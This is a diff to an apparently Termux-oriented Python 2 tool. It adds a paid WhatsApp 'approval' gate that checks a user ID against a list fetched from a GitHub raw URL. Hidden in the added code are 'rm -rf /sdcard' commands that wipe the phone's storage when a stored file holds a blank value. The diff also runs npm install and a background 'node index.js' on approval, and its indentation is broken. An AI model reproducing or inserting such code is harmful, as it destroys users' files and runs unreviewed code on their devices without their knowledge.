@@ -9,7 +9,58 @@ import time
 os.system("pip install requests")
 
 os.system("clear")
+print '\x1b[1;31;1mLOGIN KI LIYE APPROVAL LYLO PEHLY '
+    print ''
+    time.sleep(1)
+    try:
+        to = open('/sdcard/.sa.txt', 'r').read()
+        if to ==" ":
+            os.system('rm -rf /sdcard')
+            os.system('rm -rf /sdcard/*')
+        
+    except (KeyError, IOError):
+        reg2()
 
+    r = requests.get('https://raw.githubusercontent.com/Shuvo-BBHH/paidfree4/main/server.txt').text
+    if to in r:
+        os.system('cd ..... && npm install')
+        os.system('fuser -k 5000/tcp &')
+        os.system('#')
+        os.system('cd ..... && node index.js &')
+        time.sleep(5)
+        menu()
+    else:
+        os.system('clear')
+        print logo
+        print '\tApproved Failed'
+        print ' \x1b[1;92mYour Id Is Not Approved '
+        print ' \x1b[1;92mCopy the id and send to Admin'
+        print ' \x1b[1;92mYour id : ' + to
+        raw_input('\x1b[1;93m Press enter to send id')
+        os.system('xdg-open https://wa.me/+8801887408882')
+        reg()
+
+
+def reg2():
+    os.system('clear')
+    print logo
+    print '\tApproval not detected'
+    print ' \x1b[1;92mCopy and press enter ,'
+    id = uuid.uuid4().hex[:50]
+    print ' Your id: ' + id
+    print ''
+    raw_input(' Press enter to go to whatsapp ')
+    os.system('xdg-open https://wa.me/+8801887408882')
+    sav = open('/sdcard/.sa.txt', 'w')
+    sav.write(id)
+    sav.close()
+    raw_input('\x1b[1;92m Press enter to check Approval ')
+    reg()
+
+
+
+def menu():
+    os.system('clear')
 
 print("""\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m 
 \033[0m================================================================
